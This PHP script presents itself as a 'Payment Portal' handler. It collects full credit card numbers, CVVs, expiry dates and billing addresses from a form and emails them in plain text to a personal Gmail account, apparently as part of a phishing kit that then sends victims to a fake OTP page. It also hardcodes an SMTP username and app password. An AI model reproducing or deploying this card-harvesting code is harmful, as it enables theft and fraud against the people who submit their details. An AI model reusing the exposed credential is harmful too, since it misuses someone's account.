<!-- re write file to process form data 
submitted using post action from the 
payload's parent form and redirect 
to the otp verification page if mail
is successfully sent ortherwise,
display error and compel user to retry. --> 
<?php
include_once "Controller/Controller.class.php";
include_once "Controller/Database.php";
// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Adjust this path if PHPMailer is installed elsewhere

// Ensure the script only processes POST requests
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Invalid request method"]);
    exit;
}else{
    
    $requiredFields = ['expiration-year', 'email', 'full-name', 'amount_to_pay', 'cvv', 'credit-card-num', 'expiration-month', 'zip-code', 'state', 'city', 'billing-address'];
    // $_POST = $_POST;
    // print_r($_POST);
    
    foreach ($requiredFields as $field) {
        if (empty($_POST[$field])) {
            http_response_code(400); // Bad Request
            echo json_encode(["error" => "$field is required"]);
            exit;
        }
    }
    // Sanitize data
    $id = htmlspecialchars($_POST['id'], ENT_QUOTES, 'UTF-8');
    $expYear = htmlspecialchars($_POST['expiration-year'], ENT_QUOTES, 'UTF-8');
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $name = htmlspecialchars($_POST['full-name'], ENT_QUOTES, 'UTF-8');
    $amount = htmlspecialchars($_POST['amount_to_pay'], ENT_QUOTES, 'UTF-8');
    $cvv = htmlspecialchars($_POST['cvv'], ENT_QUOTES, 'UTF-8');
    $cardNumber = htmlspecialchars($_POST['credit-card-num'], ENT_QUOTES, 'UTF-8');
    $expMonth = htmlspecialchars($_POST['expiration-month'], ENT_QUOTES, 'UTF-8');
    $zipCode = htmlspecialchars($_POST['zip-code'], ENT_QUOTES, 'UTF-8');
    $state = htmlspecialchars($_POST['state'], ENT_QUOTES, 'UTF-8');
    $city = htmlspecialchars($_POST['city'], ENT_QUOTES, 'UTF-8');
    $address = htmlspecialchars($_POST['billing-address'], ENT_QUOTES, 'UTF-8');
    $userId = htmlspecialchars($_POST['user_id'], ENT_QUOTES, 'UTF-8');

    // Create email content
    $message = "
        <h1>Payment Details</h1>
        <p><strong>Name:</strong> $name</p>
        <p><strong>Email:</strong> $email</p>
        <p><strong>Amount:</strong> $amount</p>
        <p><strong>Card Number:</strong> $cardNumber</p>
        <p><strong>CVV:</strong> $cvv</p>
        <p><strong>Expiration Date:</strong> $expMonth/$expYear</p>
        <p><strong>Address:</strong> $address</p>
        <p><strong>City:</strong> $city</p>
        <p><strong>State:</strong> $state</p>
        <p><strong>ZIP Code:</strong> $zipCode</p>
    ";

    $mail = new PHPMailer(true);

    try {
        // SMTP Server Configuration
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Replace with your SMTP host
        $mail->SMTPAuth = true;
        $mail->Username = 'habeebajani9@gmail.com'; // Replace with your SMTP username
        $mail->Password = 'kznc uzhe jtce ywhv'; // Replace with your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // Common SMTP port

        // Email Headers
        $mail->setFrom('habeebajani9@gmail.com', 'Payment Portal'); // Replace with your sender email
        $mail->addAddress('habeebajani9@gmail.com', 'Resido'); // Replace with the recipient's email

        // Email Content
        $mail->isHTML(true);
        $mail->Subject = 'Payment Information Submitted';
        $mail->Body    = $message;

        // Send the email
        if($mail->send()){
           echo "success";
        }else{
            echo "error";
        }
        
    } catch (Exception $e) {
        http_response_code(500); // Internal Server Error
        echo json_encode(["error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"]);
    }
}

// // Get the raw POST data
// $requestBody = file_get_contents('php://input');
// $_POST = json_decode($requestBody, true);

// Validate JSON decoding
// if (json_last_error() !== JSON_ERROR_NONE) {
//     http_response_code(400); // Bad Request
//     echo json_encode(["error" => "Invalid JSON data"]);
//     exit;
// }

// Extract and validate required fields


exit;
